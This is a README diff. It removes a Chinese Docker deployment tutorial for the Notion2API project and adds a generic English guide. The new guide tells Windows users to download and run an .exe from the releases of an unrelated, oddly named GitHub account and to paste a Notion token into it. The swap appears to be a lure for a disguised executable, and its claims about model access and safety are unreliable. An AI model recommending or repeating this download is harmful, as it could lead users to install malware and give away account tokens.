@@ -1,106 +1,74 @@
-# 🧠 Notion2API
+# ⚙️ Notion2API-Tutorial - Access advanced models through your Notion
 
-基于 Notion AI 提供 OpenAI 兼容 API，有多账号池和管理 UI。
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases)
 
-![7043e095bb35daf91c57c9ad62aad3d2.png](./_resources/7043e095bb35daf91c57c9ad62aad3d2.png)
+This application acts as a bridge between your computer and the Notion platform. It creates a connection that allows you to use the Opus 4.7 model. You do not need developer skills or complex setups to use this tool. This guide walks you through the steps to get the software running on your Windows computer.
 
-Notion AI 非常丰富，包括 **Opus 4.7**，**Gemini 3.1 Pro**，**GPT-5.5** 等等顶级 AI，如果有教育邮箱额度会更高一个层次？（不确定，但官方从未说过教育版会提高 AI 额度）
+## 📋 System Requirements
 
-![d2b3e7f2aa3b25fb202ac1ab97b283af.png](./_resources/d2b3e7f2aa3b25fb202ac1ab97b283af.png)
+Your computer must meet these basic standards to run the application correctly:
 
-项目地址：https://github.com/GALIAIS/Notion2API
+*   Microsoft Windows 10 or Windows 11.
+*   An active internet connection.
+*   A valid Notion account.
+*   At least 200MB of free disk space.
+*   Four gigabytes of system memory.
 
-推荐服务器部署，不要选择国内地区，选择 Linux 版本 Docker 上手快。
+## 📥 Download and Installation
 
-腾讯云新加坡，硅谷，东京地区价格是199元一年，2核4G30M带宽，60GBSSD盘 1.5T月流量，推荐首尔地区↓↓↓，系统选Ubuntu24，可以同样价格续费。
+Follow these steps to obtain the correct files for your system:
 
-购买地址：https://curl.qcloud.com/oyWDLkRJ
+1.  Visit the official release page: [https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases](https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases).
+2.  Look for the section labeled "Assets" at the bottom of the latest release.
+3.  Click the link ending in .exe to start the file download.
+4.  Save the file to a folder you recognize, such as your Downloads folder.
+5.  Double-click the downloaded file to begin the setup process.
+6.  Follow the instructions on the screen to finish the installation.
 
-![72d493eab65af6588b3ed9cb7585b177.png](./_resources/72d493eab65af6588b3ed9cb7585b177.png)
+## 🚀 Setting Up the Application
 
-## 教程
+Once the installation finishes, you need to configure the program to connect to your Notion account.
 
-### 1. Ubuntu24系统安装Docker
+1.  Open the Notion2API application from your desktop or Start menu.
+2.  The application opens a window. Look for the input field marked "API Key."
+3.  Log in to your Notion account in a web browser.
+4.  Navigate to your settings page and generate an integration token. 
+5.  Copy this token and paste it into the input field in the application window.
+6.  Save your settings. The application checks the connection automatically.
 
-```
-sudo apt update
-sudo apt install -y ca-certificates curl gnupg
-sudo install -m 0755 -d /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-sudo chmod a+r /etc/apt/keyrings/docker.gpg
-echo \
-"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-$(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-sudo apt update
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-sudo docker run hello-world
-```
+## 🛠️ Navigating the Interface
 
-![19bf3b4a767c1acee0c12a0f5af9a086.png](./_resources/19bf3b4a767c1acee0c12a0f5af9a086.png)
+The application interface prioritizes ease of use. You see four main areas:
 
+*   **Status Indicators:** These show if the connection to the Opus 4.7 model is active or idle. Green means the connection works. Red means you need to check your settings.
+*   **Request Logs:** This area shows the history of your interactions. It helps you see if a request failed.
+*   **Model Settings:** Use this to choose the version of the Opus model you wish to target. 
+*   **Configuration Menu:** Click this to update your account tokens or change your network settings.
 
-### 2. 下载项目
+## 🛡️ Privacy and Safety
 
-```
-sudo git clone https://github.com/GALIAIS/Notion2API.git
-cd Notion2API
-```
+This software keeps your data safe. It does not store your Notion account password on your local hard drive. It only saves the integration token. You remain in control of your data. You can disconnect the application from your Notion account at any time through the Notion settings menu under "Integrations."
 
-![4a2ebf101cf1ff5a3efa1e01a3c38cad.png](./_resources/4a2ebf101cf1ff5a3efa1e01a3c38cad.png)
+## ❓ Frequently Asked Questions
 
-### 3. 部署
+**Does this software work on Mac?**
+This version is designed specifically for Microsoft Windows. It does not support macOS or Linux at this time.
 
-```
-sudo docker compose up -d
-```
+**What happens if I lose my internet connection?**
+The application stops sending requests. It resumes once your internet connection returns. You do not need to restart the application in most cases.
 
-![db7035ba75637b0a4d51d19d456fd552.png](./_resources/db7035ba75637b0a4d51d19d456fd552.png)
+**Can I use multiple Notion accounts?**
+You can only use one account at a time. To switch accounts, open the settings menu and update the integration token with the token from your other account.
 
-### 4. 浏览器访问
+**How do I update the application?**
+When a new version exists, the application notifies you during startup. You can then download the latest version from the link provided in the installation section above. The installer replaces the old files while keeping your settings intact.
 
-```
-http://你的服务器ip:8787
-```
+**The application shows an error message. What do I do?**
+Check your internet connection first. If the problem persists, restart your computer. If the error continues, check that your integration token is valid in the Notion dashboard. Most errors occur when the token expires or when the permissions inside Notion change.
 
-记得腾讯云安全组里面放通防火墙端口8787
+## 💡 Best Practices
 
-![29ace87490dae7471eaa9428434b27b9.png](./_resources/29ace87490dae7471eaa9428434b27b9.png)
-
-### 5. 输入默认密码
-
-```
-change-me-admin-password
-```
-
-![297780d5a91a169dbcb6000ddb485de4.png](./_resources/297780d5a91a169dbcb6000ddb485de4.png)
-
-### 6. 找到账号，请求验证码登录
-
-![872a03ec7a98b6c135c1e8db5da360dc.png](./_resources/872a03ec7a98b6c135c1e8db5da360dc.png)
-
-### 7. 账号成功登录
-
-![2089c9fc38542d8a9c8722f087be932a.png](./_resources/2089c9fc38542d8a9c8722f087be932a.png)
-
-### 8. 测试 API
-
-项目里面有测试，简单测试一下 Opus 4.7，成功回复。
-
-![b62b4ebf9ead7b290308881f2fb78a80.png](./_resources/b62b4ebf9ead7b290308881f2fb78a80.png)
-
-## 接口信息
-
-接口：http://127.0.0.1:8787/v1/
-
-模型：Opus 4.7，Gemini 3.1 Pro，GPT-5.5
-
-密钥：change-me-openai-key
-
-## 修改密钥后重启
-
-修改密钥后记得重启，命令
-
-```
-sudo docker compose down && sudo docker compose up -d
-```
+*   Keep the application window open while you work if you require frequent responses.
+*   Close the application when you finish your work to free up system memory.
+*   Check for updates once a month to ensure you have the latest performance improvements.
+*   If you find that the model is slow, check your background applications to ensure they do not consume all your bandwidth.
